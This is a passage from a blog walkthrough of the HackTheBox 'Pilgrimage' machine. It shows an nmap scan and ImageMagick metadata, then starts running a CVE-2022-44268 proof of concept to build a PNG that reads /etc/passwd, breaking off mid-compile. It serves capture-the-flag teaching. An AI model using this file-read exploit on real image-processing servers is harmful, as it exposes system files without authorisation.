---
title: HTB Pilgrimage Walkthrough
url: https://www.secjuice.com/htb-pilgrimage-walkthrough/
source: Over Security - Cybersecurity news aggregator
date: 2024-11-01
fetch_date: 2025-10-06T19:19:44.100275
---

# HTB Pilgrimage Walkthrough

[![Secjuice](https://www.secjuice.com/content/images/2018/12/Logo-1.png)](https://www.secjuice.com)

* [Donate](https://opencollective.com/secjuice)
* [About Us](https://secjuice.com/about-us/)
* [Technical](https://secjuice.com/tag/technical/)
* [OSINT](https://secjuice.com/tag/OSINT/)
* [Unusual Journeys](https://secjuice.com/tag/unusual-journeys-into-infosec/)
* [HoF](https://secjuice.com/secjuice-hall-of-fame/)
* [Write With Us](https://secjuice.com/join-secjuice-writing-team/)
* [Hire A Writer](https://secjuice.com/hire-infosec-cybersecurity-writer/)
* [Rankings](https://secjuice.com/secjuice-writers-ranking/)

[Sign in](#/portal/signin)
[Subscribe](#/portal/signup)

[TECHNICAL](/tag/technical/)

# HTB Pilgrimage Walkthrough

Search for flags using tools like nmap and ImageMagick, identify vulnerabilities, exploit them, find user credentials, and capture flags. Happy hacking the box!

* [![Andy74](/content/images/size/w100/2020/01/avatar.png)](/author/andy74/)

#### [Andy74](/author/andy74/)

Oct 31, 2024
• 23 min read

![HTB Pilgrimage Walkthrough](/content/images/size/w2000/2024/10/pumpkins-and-gourds-on-a-pilgrimage.png)

This image was created using Microsoft Copilot.

There is nothing particular to report about this BOX, which, despite its simplicity, manages to give satisfaction at every moment of the investigation. Let's go immediately to go in search of flags.

Let's start with the **nmap** scan.

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-09 10:52 CEST
Nmap scan report for 10.10.11.219
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.09 seconds
```

A classical HTB BOX. Add domain "**pilgrimage.htb**" to the **/etc/hosts** file.

![](https://www.secjuice.com/content/images/2023/07/img-00-1.png)

It seems to be a portal that reduces images (or processes them anyway). There is the possibility to register and maintain a personal dashboard where all the images *shrinked* up to that moment are kept. Let's try to analyze one of the images elaborated by the portal.

```
┌──(in7rud3r㉿in7rud3r-kali)-[~/…/hackthebox/_10.10.11.219 - Pilgrimage (lin)/attack/dwnl]
└─$ exif 64aa80ee11e1f.png
Corrupt data
The data provided does not follow the specification.
ExifLoader: The data supplied does not seem to contain EXIF data.

┌──(in7rud3r㉿in7rud3r-kali)-[~/…/hackthebox/_10.10.11.219 - Pilgrimage (lin)/attack/dwnl]
└─$ identify -verbose 64aa80ee11e1f.png
Image:
  Filename: 64aa80ee11e1f.png
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: DirectClass
  Geometry: 184x321+0+0
  Resolution: 37.8x37.8
  Print size: 4.86772x8.49206
  Units: PixelsPerCentimeter
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianness: Undefined
  Depth: 8-bit
  Channel depth:
    red: 8-bit
    green: 8-bit
    blue: 8-bit
  Channel statistics:
    Pixels: 59064
    Red:
      min: 25  (0.0980392)
      max: 255 (1)
      mean: 165.651 (0.649612)
      standard deviation: 64.5314 (0.253065)
      kurtosis: -1.03005
      skewness: -0.581205
      entropy: 0.937072
    Green:
      min: 9  (0.0352941)
      max: 237 (0.929412)
      mean: 140.666 (0.551632)
      standard deviation: 62.6611 (0.24573)
      kurtosis: -1.1096
      skewness: -0.461928
      entropy: 0.930817
    Blue:
      min: 0  (0)
      max: 210 (0.823529)
      mean: 106.895 (0.419198)
      standard deviation: 52.2698 (0.20498)
      kurtosis: -1.13084
      skewness: -0.456009
      entropy: 0.925638
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 137.738 (0.540147)
      standard deviation: 59.8208 (0.234591)
      kurtosis: -1.03614
      skewness: -0.260933
      entropy: 0.931176
  Rendering intent: Perceptual
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Background color: white
  Border color: srgb(223,223,223)
  Matte color: grey74
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 184x321+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2023-07-09T09:44:38+00:00
    date:modify: 2023-07-09T09:42:06+00:00
    date:timestamp: 2023-07-09T09:42:06+00:00
    png:bKGD: chunk was found (see Background color, above)
    png:cHRM: chunk was found (see Chromaticity, above)
    png:gAMA: gamma=0.45455 (See Gamma, above)
    png:IHDR.bit-depth-orig: 8
    png:IHDR.bit_depth: 8
    png:IHDR.color-type-orig: 2
    png:IHDR.color_type: 2 (Truecolor)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 184, 321
    png:pHYs: x_res=3780, y_res=3780, units=1
    png:sRGB: intent=0 (Perceptual Intent)
    png:text: 3 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2023-07-09T09:42:06Z
    signature: d4a0c4b8b3bb98ac0b6c6494c2e0df59b50d32fe7dfbffa554e21c8b33797efe
  Artifacts:
    filename: 64aa80ee11e1f.png
    verbose: true
  Tainted: False
  Filesize: 91683B
  Number pixels: 59064
  Pixels per second: 10.2956MB
  User time: 0.000u
  Elapsed time: 0:01.005
  Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org
```

The absence of the **exif** information may not even indicate anything. The only interesting information could be the tool used to resize the image: **ImageMagick 6.9.11-60**. I will investigate this later, let's see, rather, if there is any *injection* on the filename that is passed to the tool, *traversal path* or similar; it's **burpsuite** time.

It also occurred to me that a *traversal path* might be present on the file returned after the manipulation. After searching with the first manual tests, I rely on a more suitable tool like **dotdotpwn**.

Let's go back to the resize tool, **ImageMagick**, and look for some *exploits*.

Searching for "*ImageMagick 6.9.11 exploit*" I found a lot of **DoS** attacks, but nothing useful for me. In addition, there are also a lot of interesting *exploit*:

[ImageMagick 7.1.0-49 - Arbitrary File Read

ImageMagick 7.1.0-49 - Arbitrary File Read. CVE-2022-44268 . local exploit for Multiple platform

![](https://www.exploit-db.com/favicon.ico)Exploit DatabaseCristian Giustini

![](https://www.exploit-db.com/images/spider-orange.png)](https://www.exploit-db.com/exploits/51261?ref=secjuice.com)

The tool generates an image containing some code that **ImageMagick** interprets and executes. In this case, it fetches the **/etc/passwd** file and puts it in the information of the resized file. Let's see if and how it works.

```
┌──(in7rud3r㉿in7rud3r-kali)-[~/…/_10.10.11.219 - Pilgrimage (lin)/attack/git/CVE-2022-44268]
└─$ cargo run "/etc/passwd"
    Updating crates.io index
  Downloaded bitflags v1.3.2
  Downloaded adler v1.0.2
  Downloaded cfg-if v1.0.0
  Downloaded hex v0.4.3
  Downloaded flate2 v1.0.25
  Downloaded miniz_oxide v0.6.2
  Downloaded png v0.17.7
  Downloaded crc32fast v1.3.2
  Downloaded 8 crates (301.4 KB) in 0.85s
   Compiling crc32fast v1.3.2
   Compiling cfg-if v1.0.0
   Compiling adler v1.0.2
   Compiling bitflags v1.3.2
   Compiling hex v0.4.3
   Compiling miniz_oxide v0.6.2
   Compiling flate2 v1.0.25
   Compiling png v0.17.7
   Compiling cve-2022-44268 v0.1.0 (/home/in7rud3r/Dropbox/hackthebox/_10.10.11.219 - Pilgrimage (lin)/attack/git/CVE-202...